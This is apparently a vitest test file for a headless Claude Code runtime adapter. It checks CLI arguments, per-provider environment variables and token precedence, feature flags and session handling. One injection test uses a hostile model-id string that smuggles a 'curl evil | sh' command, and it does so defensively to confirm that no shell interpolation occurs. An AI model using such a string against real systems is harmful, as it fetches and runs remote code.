import { describe, it, expect } from 'vitest'
import {
  buildHeadlessArgs,
  buildHeadlessEnv,
  resolveFleetOauthToken,
  workerRuntimeKind,
  headlessHomeFor,
  claudeHeadlessRuntime,
  HEADLESS_DISALLOWED_TOOLS,
} from '../runtime/claude-headless.js'
import { resolveProviderEnvVars } from '../runtime/anthropic-compat-env.js'
import { bgRuntimeKind, isRuntimeBackedSession, runtimeSessionRef } from '../web/routes/background-tasks.js'

describe('buildHeadlessArgs', () => {
  it('minimal: print mode, stream-json, verbose, model, bypass permissions', () => {
    expect(buildHeadlessArgs({ model: 'claude-sonnet-5' })).toEqual([
      '-p', '--output-format', 'stream-json', '--verbose', '--model', 'claude-sonnet-5', '--permission-mode', 'bypassPermissions',
    ])
  })
  it('resume wins over an explicit session id; tools, mcp isolation, settings', () => {
    const a = buildHeadlessArgs({
      model: 'claude-haiku-4-5-20251001', resume: 'sid-1', sessionId: 'ignored',
      disallowedTools: HEADLESS_DISALLOWED_TOOLS, mcpConfigPath: '/x/.mcp.json', settingsJson: '{"a":1}', noSessionPersistence: true,
    })
    expect(a).toContain('--resume'); expect(a[a.indexOf('--resume') + 1]).toBe('sid-1')
    expect(a).not.toContain('--session-id')
    expect(a.slice(a.indexOf('--disallowedTools') + 1, a.indexOf('--disallowedTools') + 1 + HEADLESS_DISALLOWED_TOOLS.length)).toEqual([...HEADLESS_DISALLOWED_TOOLS])
    expect(a).toContain('--mcp-config'); expect(a).toContain('--strict-mcp-config')
    expect(a).toContain('--settings'); expect(a).toContain('--no-session-persistence')
  })
  it('session id is used when there is nothing to resume; strictMcp can be relaxed', () => {
    const a = buildHeadlessArgs({ model: 'm', sessionId: 'fresh', mcpConfigPath: '/m.json', strictMcp: false })
    expect(a[a.indexOf('--session-id') + 1]).toBe('fresh')
    expect(a).not.toContain('--strict-mcp-config')
  })
  it('the model id is a separate argv element (never shell-interpolated)', () => {
    const hostile = "x'; curl evil | sh; echo '"
    const a = buildHeadlessArgs({ model: hostile })
    expect(a[a.indexOf('--model') + 1]).toBe(hostile)
  })
})

describe('buildHeadlessEnv', () => {
  const base = { PATH: '/usr/bin', TELEGRAM_BOT_TOKEN: 'leak', CLAUDE_CODE_OAUTH_TOKEN: 'inherited' }
  it('anthropic + subscription: fleet OAuth token, isolated config dir, updater off, bot tokens stripped', () => {
    const env = buildHeadlessEnv({
      spec: { id: 'a', model: 'claude-sonnet-5', provider: 'anthropic', authMode: 'subscription' },
      configDir: '/cfg', oauthToken: 'fleet-tok', secretLookup: () => null, base,
    })
    expect(env.CLAUDE_CODE_OAUTH_TOKEN).toBe('fleet-tok')
    expect(env.CLAUDE_CONFIG_DIR).toBe('/cfg')
    expect(env.DISABLE_AUTOUPDATER).toBe('1')
    expect(env.CLAUDE_CODE_ENABLE_PROMPT_SUGGESTION).toBe('false')
    expect(env.TELEGRAM_BOT_TOKEN).toBeUndefined()
    expect(env.ANTHROPIC_API_KEY).toBeUndefined()
    expect(env.ANTHROPIC_BASE_URL).toBeUndefined()
  })
  it('anthropic + api: per-agent vault key wins and the OAuth token is dropped', () => {
    const env = buildHeadlessEnv({
      spec: { id: 'argus', model: 'claude-sonnet-5', provider: 'anthropic', authMode: 'api' },
      configDir: '/cfg', oauthToken: 'fleet-tok',
      secretLookup: (id) => (id === 'agent-argus-api-key' ? 'sk-agent' : id === 'ANTHROPIC_API_KEY' ? 'sk-fleet' : null), base,
    })
    expect(env.ANTHROPIC_API_KEY).toBe('sk-agent')
    expect(env.CLAUDE_CODE_OAUTH_TOKEN).toBeUndefined()
  })
  it('anthropic + api without any key falls back to the OAuth token rather than running logged-out', () => {
    const env = buildHeadlessEnv({
      spec: { id: 'a', model: 'claude-sonnet-5', provider: 'anthropic', authMode: 'api' },
      configDir: '/cfg', oauthToken: 'fleet-tok', secretLookup: () => null, base,
    })
    expect(env.CLAUDE_CODE_OAUTH_TOKEN).toBe('fleet-tok')
  })
  it('deepseek: Anthropic-compatible redirect vars from the vault', () => {
    const env = buildHeadlessEnv({
      spec: { id: 'a', model: 'deepseek-v4-pro', provider: 'deepseek', authMode: 'api' },
      configDir: '/cfg', oauthToken: 'fleet-tok', secretLookup: (id) => (id === 'DEEPSEEK_API_KEY' ? 'ds' : null), base,
    })
    expect(env.ANTHROPIC_AUTH_TOKEN).toBe('ds')
    expect(env.ANTHROPIC_BASE_URL).toBe('https://api.deepseek.com/anthropic')
    expect(env.ANTHROPIC_MODEL).toBe('deepseek-v4-pro')
  })
})

describe('resolveProviderEnvVars (structured twin of resolveProviderEnv)', () => {
  it('minimax carries the 1M context override; ollama uses the literal token; anthropic/openai/google are empty', () => {
    expect(resolveProviderEnvVars('minimax-m3', () => 'k')).toMatchObject({ ANTHROPIC_BASE_URL: 'https://api.minimax.io/anthropic', CLAUDE_CODE_MAX_CONTEXT_TOKENS: '1000000' })
    expect(resolveProviderEnvVars('qwen3.6:27b', () => null).ANTHROPIC_AUTH_TOKEN).toBe('ollama')
    expect(resolveProviderEnvVars('claude-sonnet-5', () => 'k')).toEqual({})
    expect(resolveProviderEnvVars('gpt-5.6-sol', () => 'k')).toEqual({})
    expect(resolveProviderEnvVars('gemini-2.5-pro', () => 'k')).toEqual({})
  })
})

describe('resolveFleetOauthToken precedence', () => {
  it('process env > .env line (quotes stripped) > store file', () => {
    expect(resolveFleetOauthToken({ env: { CLAUDE_CODE_OAUTH_TOKEN: ' p ' }, readEnv: () => 'e', readStoreFile: () => 's' })).toBe('p')
    expect(resolveFleetOauthToken({ env: {}, readEnv: () => '"e"', readStoreFile: () => 's' })).toBe('e')
    expect(resolveFleetOauthToken({ env: {}, readEnv: () => undefined, readStoreFile: () => 's\n' })).toBe('s')
    expect(resolveFleetOauthToken({ env: {}, readEnv: () => undefined, readStoreFile: () => null })).toBeNull()
  })
})

describe('feature flags', () => {
  it('workerRuntimeKind defaults to claude-tmux (behaviour-neutral)', () => {
    expect(workerRuntimeKind({})).toBe('claude-tmux')
    expect(workerRuntimeKind({ MARVEEN_WORKER_RUNTIME: 'claude-headless' })).toBe('claude-headless')
    expect(workerRuntimeKind({ MARVEEN_WORKER_RUNTIME: 'CLAUDE-HEADLESS ' })).toBe('claude-headless')
    expect(workerRuntimeKind({ MARVEEN_WORKER_RUNTIME: 'codex-cli' })).toBe('claude-tmux')
  })
  it('bgRuntimeKind defaults to the legacy tmux path; only known runtimes switch it', () => {
    expect(bgRuntimeKind({})).toBe('legacy-tmux')
    expect(bgRuntimeKind({ MARVEEN_BG_RUNTIME: 'claude-headless' })).toBe('claude-headless')
    expect(bgRuntimeKind({ MARVEEN_BG_RUNTIME: 'nonsense' })).toBe('legacy-tmux')
  })
  it('runtime-backed session refs are recognisable and never look like tmux sessions', () => {
    const ref = runtimeSessionRef('claude-headless', 'ABCD1234')
    expect(ref).toBe('rt:claude-headless:ABCD1234')
    expect(isRuntimeBackedSession(ref)).toBe(true)
    expect(isRuntimeBackedSession('bg-ABCD1234')).toBe(false)
    expect(isRuntimeBackedSession(null)).toBe(false)
  })
})

describe('adapter shape', () => {
  it('headless home is keyed by agent id, capabilities are non-interactive/event-reporting', () => {
    expect(headlessHomeFor('icukadev').endsWith('/.icukadev-headless')).toBe(true)
    const caps = claudeHeadlessRuntime.capabilities({
      id: 'x', dir: '/tmp/x', role: 'worker', model: 'claude-opus-5',
      runtime: 'claude-headless', provider: 'anthropic', authMode: 'subscription', securityProfile: 'default',
    })
    expect(caps).toMatchObject({ interactive: false, supportsResume: true, supportsChannelsPlugin: false, reportsUsage: 'events', contextWindow: 1_000_000 })
  })
  it('state of an unknown handle is dead; stop is idempotent', async () => {
    const h = { agentId: 'x', runtime: 'claude-headless' as const, sessionRef: 'headless:x:nope' }
    expect(await claudeHeadlessRuntime.state(h)).toBe('dead')
    await claudeHeadlessRuntime.stop(h)
    expect(await claudeHeadlessRuntime.state(h)).toBe('dead')
  })
})
